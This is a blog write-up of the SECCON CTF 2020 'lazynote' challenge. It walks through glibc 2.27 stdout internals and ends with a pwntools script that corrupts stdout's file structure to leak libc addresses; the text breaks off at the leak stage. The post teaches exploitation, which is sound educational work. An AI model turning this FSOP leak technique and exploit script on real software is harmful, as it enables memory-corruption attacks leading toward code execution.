---
layout: post
title:  "File Structure Oriented Programming: SECCON CTF 2020 - lazynote"
date:   2020-10-13 14:00:00 +0800
categories: pwn
tags: SECCON-2020
---

# It's been a while...

It's been a while since I wrote anything for this blog. Over the course of 2020, I've been really busy with University studies, tutoring, and a job, which meant that I really never had any weekends free to participate in CTFs. As a result of this, I've felt my pwning skills (particularly with regards to exploit development) go down the drain. My work is also heavily code auditing focused, which doesn't help at all.. 

I think the only CTF in 2020 that I briefly tried out was Google CTF 2020 Qualifiers, particularly the `teleport` challenge, but I didn't have enough time to spend to solve it. With the semester now coming to an end though, I suddenly have just a little bit more time than usual, so I've decided to get back into the CTF scene and hone my skills further than I ever did before. 

When I stopped playing CTFs, I had just learned about GLIBC heap exploitation, and kind of left it at that and moved on into browser exploitation. Nowadays though, it seems that File Structure Oriented Programming (FSOP) is the new big thing when it comes to GLIBC pwn challenges, and although I don't particularly like GLIBC heap challenges, the FSOP style challenges always intrigued me, so what better way to come back into the CTF scene than to try and learn how it works? 

# Introduction

The first CTF I ***really*** tried out (it's been a LONG time) was SECCON CTF 2020 last weekend. It had a challenge called `lazynote` which was an FSOP challenge (I use the FSOP term very loosely here. If the challenge involves using the GLIBC File IO structures to pwn the challenge, then I consider it FSOP). The binary itself was really simple, and the bug was very easy to find, so I won't go into the details of the code.

During the CTF, I found the bug, but I was completely stumped on how to exploit it. I knew that I could write four NULL bytes anywhere into Libc (more on that below), and I also knew that it would have something to do with FSOP (i.e overwriting stuff in the `stdout`/`stdin` file structures), but my knowledge of GLIBC was lacking, and I just didn't know what to do to get a shell. Instead of attempting to figure it out during the CTF though, I moved onto attempting to solve the `kvdb` challenge, which I spent a few hours on but wasn't able to solve before the CTF ended.

I decided that this would be my time to get back into CTFs, and I'd start off by finally learning how FSOP worked. I very briefly looked at the exploit script by the author ([ptr-yudai](https://twitter.com/ptrYudai), an amazing pwner btw) but didn't understand it, so I decided that instead of reverse engineering the exploit script, I'd start over and just read the GLIBC source code to figure out how to solve the challenge.

Without further ado, let's get into the steps I took to figure out how to write an exploit for this challenge.

# The bug

But first, what is the bug? A summary of the challenge:

1. It essentially printed a menu and gave you four choices.
2. Only the first choice worked, and this choice would ask you for an `allocation_size`, a `read_size`, and the `data` that you want the program to read. 
  * It performs extensive checks on the allocation and read sizes to ensure you can't enter zero or negative numbers.
3. It uses `calloc` to allocate `allocation_size` bytes. Lets call this allocated memory region `buf`.
4. It then checks whether `read_size <= allocation_size`, and if it is, it sets `allocation_size = read_size`. No bug so far as there is no way to bypass this check.
5. It then reads `allocation_size` bytes into `buf`.
6. It then sets `buf[read_size - 1] = 0`. **This leads to an out of bounds write of a NULL byte if `read_size > allocation_size`.**
7. It lets you do all of the above exactly 4 times before exiting.

The challenge uses Libc 2.27, which is important to note.

# Throwback to Trick or Treat

This reminded me of a CTF challenge I did a writeup for last year - [HITCON CTF 2019's Trick or Treat](/2019-10-14-hitconctf-2019-trick-or-treat/), which basically let you allocate a chunk of any size, and then write a quad word (8 bytes) twice into any index of this chunk. The index wasn't bounds checked, which means you could overwrite past the chunk at any index.

Since only one chunk was allocated, there was nothing interesting on the heap to overwrite. The idea with the challenge was to allocate a large chunk. This would cause the GLIBC allocator to use `mmap` to map a page in memory for this chunk. This mapped page in memory would just happen to align with Libc, which would let you overwrite anything in Libc. You would need to overwrite `__free_hook` to `&system` and trigger it to get code execution.

When I saw the bug in `lazynote`, I immediately knew that I'd have to make the allocator use `mmap` to map a chunk aligned to Libc, which would then let me write four NULL bytes anywhere into Libc. I just didn't know how to leverage this primitive and turn it into an information leak + code execution.

# First steps

Over the course of 2020, I've briefly looked at writeups for pwn challenges from CTFs. Because of this, I knew I'd need to overwrite something in the `stdout` file structure to get an information leak. I would then need to overwrite something in the `stdin` file structure to be able to read any input into anywhere in Libc (I need to do this because there is no way to just use NULL bytes to get code execution).

Armed with this knowledge, I downloaded the GLIBC source code and started reading. Doing this though, I quickly found out that it was nearly impossible to follow symbols from functions into other functions. I use a combination of `ctags` and `cscope` to find symbols, but the glibc code base is unfortunately not particularly well written, so this didn't work as well as I'd have hoped. 

The way I figured out which functions were being called was to download the glibc 2.27 source code, load it up into GDB, and follow the code to see what gets called. To do this, do the following:

1. `$ wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.gz`
2. `$ tar -xvf glibc-2.27.tar.gz`
3. Run the binary in GDB and set a breakpoint anywhere (or CTRL + C)
4. In GDB: `dir path/to/glibc-2.27/libio/`

Once you've done this, you should be able to do line by line debugging of Libc in GDB (assuming you're using something like `gdb-gef`). Ensure you're using a `libc-2.27.so` file that has debugging symbols enabled.

# Diving into LIBC code

The first thing I noticed was that the program was calling `puts`, which uses the `stdout` file structure. I started by looking at this file structure in the GLIBC code to figure out what I'm up against:

```c
// libio/bits/libio.h:245

struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

The majority of the interesting looking fields (i.e `_IO_read_ptr`, `_IO_write_base`, etc) have a comment above them saying that they are for the "C++ streambuf protocol", which automatically tells me that they have something to do with `stdout` and `stdin`'s buffering. Basically, `stdout` can be **unbuffered**, **line-buffered**, or **fully-buffered**. Depending on the buffering mode, the program will output stuff differently:

* Unbuffered - The program will output any characters into `stdout` as soon as possible.
* Line-buffered - The program will output characters when it sees a newline.
* Fully-buffered - The program will output characters when `stdout`'s buffer is full.

In the case of this challenge, it makes `stdout`, `stdin`, and `stderr` unbuffered at the beginning of `main` (by using `setbuf`), so we don't have any buffering. A side effect of the unbuffered mode is that all of these fields (except `_IO_buf_end`) are set to the exact same value (a valid pointer!):

```
gef➤  p _IO_2_1_stdout_ 
$1 = {
  file = {
    _flags = 0xfbad2887,
    _IO_read_ptr = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7f3bd73987e3 <_IO_2_1_stderr_+169> "",
    _IO_write_end = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7f3bd73987e3 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7f3bd73987e4 <_IO_2_1_stdout_+132> "",
    // [ ... ]
  },
  vtable = 0x7f3bd73942a0 <__GI__IO_file_jumps>
}
```

From here, I knew that I'd need an information leak to get anywhere, and the only two functions the program uses to output to `stdout` are `puts` and `printf`. I decided to see how `puts` was implemented in Libc, so I started following the code by setting a breakpoint at `puts`. The first function it calls into is `_IO_puts`. The code for this is shown below.

**Note**: For any code shown from now on, any comments I add to the code will start with `// ##`. I will also only show the code relevant to the challenge, as otherwise it would just require too much scrolling up and down.

```c
// libio/ioputs.c:31

int                                                                             
_IO_puts (const char *str)                                                      
{                                                                               
  int result = EOF;                                                             
  _IO_size_t len = strlen (str);                                                
  _IO_acquire_lock (_IO_stdout);                                                
                                                                                
  if ((_IO_vtable_offset (_IO_stdout) != 0                                      
       || _IO_fwide (_IO_stdout, -1) == -1)                                     
      && _IO_sputn (_IO_stdout, str, len) == len                                
      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)                           
    result = MIN (INT_MAX, len + 1);                                            
                                                                                
  _IO_release_lock (_IO_stdout);                                                
  return result;                                                                
}                                                                               
```

Following the code, it seems to call straight into `_IO_sputn` which is further defined as `_IO_new_file_xsputn`. Again, I couldn't figure this out through the glibc source code, so I just used GDB to figure out that this function gets called:

```c
// libio/fileops.c:1218

_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING)) // [ 1 ]
    {
        // ## Is not reached since stdout is not line buffered in this challenge
        // ## [ ... ]
    }
  // ## [ 2 ]
  // ##  _IO_write_end and _IO_write_ptr have the same value, so this is false
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
        // count == 0
    }
  if (to_do + must_flush > 0) // [ 3 ]
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF) // [ 4 ]
	/* If nothing else has to be written we must not signal the
	   caller that everything has been written.  */
	return to_do == 0 ? EOF : n - to_do;

      // ## Not important
      // [ ... ]
    }
  return n - to_do;
}
```

This code first checks to see if `stdout` is both line buffered and currently outputting stuff at `[ 1 ]`. Since `stdout` is unbuffered this check fails immediately.

At `[ 2 ]`, as shown previously, `_IO_write_end` and `_IO_write_ptr` will have the same value. My suspicion is that `_IO_write_base` and `_IO_write_end` each point to the start and the end of the `stdout` buffer, while `_IO_write_ptr` points to the character in this buffer that is currently being output. Since `stdout` is unbuffered, this means that there isn't any buffer at all, which is why you end up having a case of `_IO_write_base == _IO_write_end == _IO_write_ptr`.

At `[ 3 ]`, `to_do` is set to the amount of characters to output, while `must_flush` is (I think) set to the amount of characters that need to be flushed out of the buffer. In the case of this challenge, `puts` is always called with some string, so `to_do` will always be greater than 0. `must_flush` will subsequently always be equal to 0, since `stdout` is unbuffered.

The code then ends up calling `_IO_OVERFLOW` at `[ 4 ]` to flush the `stdout` buffer. Here, `f` is the `stdout` file structure in Libc. This ends up calling `_IO_file_new_overflow`, which is shown below:

```c
// libio/fileops.c:744

int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  // ## [ 1 ]
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
        // ## Not reached as `_IO_NO_WRITES` is not set by default
    }
  // ## [ 2 ]
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
        // ## Not reached, `_IO_CURRENTLY_PUTTING` is set as shown previously,
        // ## and `_IO_write_base` is not NULL for stdout
    }
  if (ch == EOF) // [ 3 ]
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);

  // [ ... ]
}
```

The `_flags` field for `stdout` does not have `_IO_NO_WRITES` set by default, so we skip the `if` condition at `[ 1 ]`.

At `[ 2 ]`, the `_IO_CURRENTLY_PUTTING` flag is set (we are currently in `puts` after all). The `_IO_write_base` field of the `stdout` file structure is also not NULL (it is never set to NULL), so we skip this `if` statement as well.

The check at `[ 3 ]` will pass since `EOF` was passed in as the `ch` argument to this function (scroll up to where `_IO_OVERFLOW` is called). This ends up calling `_IO_do_write`. The argument `f` in this case will just be `stdout`. `_IO_do_write` is actually `_IO_new_do_write` (this aliasing thing is very annoying), which does the following:

```c
// libio/fileops.c:429

int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
```

Note that the `to_do` argument has been set to `f->_IO_write_ptr - f->_IO_write_base`.

In the normal case (i.e without any memory corruption), since `stdout` is unbuffered, both the `_IO_write_base` and `_IO_write_ptr` fields of `stdout` will have the same value. This means that the third argument will be 0, meaning the `new_do_write` function will never be called.

**However**, remember that we have a relative out of bounds write primitive, so we have the opportunity to overwrite the least significant byte of either `_IO_write_ptr` or `_IO_write_base` to `0x00`, which means we can cause this argument to be non-zero. However, in my mind, we still have to ensure that this subtraction does not yield a negative number, as that would be interpreted as a HUGE `to_do` size, which may cause the program to crash. Because of this, let's just assume that we will be overwriting the LSB of `_IO_write_base` such that it becomes smaller than `_IO_write_ptr` (remember that they both initially have the same value).

What's interesting is that if we *do* set this argument to a non-zero value and call `new_do_write` here, the `data` argument is actually just `f->_IO_write_base`, meaning it might just write out data from the `stdout` buffer. This buffer doesn't exist though (i.e its size is actually 0), so what does it write out? Let's find out.

The code for `new_do_write` is shown below:

```c
// libio/fileops.c:437

static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING) // [ 1 ] False by default
    // ## Long comment here, removed for brevity
    fp->_offset = _IO_pos_BAD;

  // ## Since _IO_read_end == _IO_write_base, this else if is usually skipped.
  // ## HOWEVER! Remember that to get to this code, we would have to modify
  // ## either the `_IO_write_ptr` or the `_IO_write_base` field of `stdout`.
  // ## If we modify `_IO_write_base`, 
  else if (fp->_IO_read_end != fp->_IO_write_base) // [ 2 ]
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do); // [ 3 ]
  
  // ## We don't care about any code after this
  // [ ... ]

  return count;
}
```

At `[ 1 ]`, the `_IO_IS_APPENDING` flag is not set by default on the `stdout` file structure, so we skip it.

At `[ 2 ]`, we know that `_IO_read_end` and `_IO_write_base` are set to the same value (from before). However, since we are assuming that we overwrote the LSB of `_IO_write_base` to get here, we would actually enter this `else if` branch. Inside here, the `_IO_SYSSEEK` will call the `lseek` system call with the `offset` argument set to a negative number (remember that `_IO_write_base` was initially equal to `_IO_read_end`, but if we overwrite its LSB with a NULL byte, it will be less than `_IO_read_end`). When `lseek` is called with a negative offset, it will return an error code, meaning the program would exit out right here.

Knowing all of this, we don't want to enter this `else if` branch. To do this, we can overwrite `_IO_read_end`'s LSB to 0 as well, which would make it equal to `_IO_write_base` again, bypassing this `else if` branch.

Next, when `_IO_SYSWRITE` is called, it ends up calling into `_IO_new_file_write`, which has the following code:

```c
// libio/fileops:1194

_IO_ssize_t
_IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)
{
  _IO_ssize_t to_do = n;
  while (to_do > 0)
    {
      _IO_ssize_t count = (__builtin_expect (f->_flags2
					     & _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f->_fileno, data, to_do)
			   : __write (f->_fileno, data, to_do));
      // [ ... ]
    }
  // [ ... ]    

  return n;
}
```

By default, the `_flags2` field of `stdout` is set to 0, so this function ends up calling `__write`, which ends up calling the `write` syscall with `fd` set to `1` (for `stdout`), `data` set to `stdout->_IO_write_base`, and `n` set to `f->_IO_write_ptr - f->_IO_write_base`. This will end up just writing data out to `stdout`. What would this data be? Let's check through GDB:

```
gef➤  p _IO_2_1_stdout_ 
$1 = {
  file = {
    // [ ... ]
    _IO_write_base = 0x7f2a5f5487e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7f2a5f5487e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7f2a5f5487e3 <_IO_2_1_stdout_+131> "\n",
    // [ ... ]
}

// Remember we'll overwrite the LSB of _IO_write_base to NULL byte
// This is the `to_do` variable, the number of bytes to write
gef➤  p 0x7f2a5f5487e3 - 0x7f2a5f548700
$2 = 0xe3

gef➤  x/10gx 0x7f2a5f548700 // LSB set to 0 for _IO_write_base
0x7f2a5f548700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007f2a5f5498b0
0x7f2a5f548710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7f2a5f548720 <_IO_2_1_stderr_+160>:	0x00007f2a5f547780	0x0000000000000000
0x7f2a5f548730 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
0x7f2a5f548740 <_IO_2_1_stderr_+192>:	0x0000000000000000	0x0000000000000000
```

Looks like it'll print out 0xe3 bytes of data from the new `_IO_write_base`, and surprisingly enough, once the LSB is set to 0, it will write out at least one Libc address! This sounds like a good way to get an information leak!

# Information Leak

So to recap, our plan of attack for the information leak is as follows.

1. Overwrite the LSB of `_IO_write_base` to 0 to confuse `puts`. `puts` will think that `stdout` is buffered when it's really not.
2. Overwrite the LSB of `_IO_read_end` to 0 (to make it equal to `_IO_write_base` to bypass that `else if` branch in `new_do_write`).

This will then cause the next `puts` (the one that prints the menu)  to call `_IO_OVERFLOW` to flush our fake buffer at the new `_IO_write_base`, which leaks some Libc addresses.

One side effect of overwriting the LSB of either `_IO_write_base` or `_IO_read_end` is that the program becomes confused about the buffering of `stdout` and thus won't be outputting the menu or any of the options for us anymore. We have to account for this in our script. I ended up just having two separate functions, one for before we overwrite the fields, and one for after:

```python
#!/usr/bin/env python3

from pwn import *

elf  = ELF("./chall")
libc = ELF("./libc-2.27.so")
p    = process("./chall", env={"LD_PRELOAD": "./libc-2.27.so"})

def create1(alloc_size, read_size, data):
        p.recv()
        p.sendline("1")
        p.recv()
        p.sendline(str(alloc_size))
        p.recv()
        p.sendline(str(read_size))
        p.recv()
        p.sendline(data)

def create2(alloc_size, read_size, data):
    p.sendline("1")
    p.sendline(str(alloc_size))
    p.sendline(str(read_size))
    p.sendline(data)

stdout = libc.sym["_IO_2_1_stdout_"]

# I found that with an allocation size of 0x200000, we can get the chunk
# mmapped and aligned to libc

# Overwrite LSB of `_IO_read_end` (offset found by using GDB)
create1(0x200000, 0x5ed761, "A")

# Overwrite LSB of `_IO_write_base` (offset found by using GDB)
create2(size, 0x5e6761 + 0x208010, "A")

# When the program attempts to print out the menu now, we will get our leak

leak = u64(p.recvline()[8:14].ljust(8, b'\x00'))
libc.address = leak - 0x3ed8b0
system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh"))

log.info("LIBC leak: " + hex(leak))
log.info("LIBC base: " + hex(libc.address))
log.info("system@LIBC: " + hex(system))
log.info("/bin/sh: " + hex(bin_sh))

p.interactive()
```

In order to find the correct offset (particularly for the second allocation in `create2`), I set a breakpoint on the instruction that executes the `buf[read_size - 1] = 0;` instruction, and checked what address it was writing to.

#
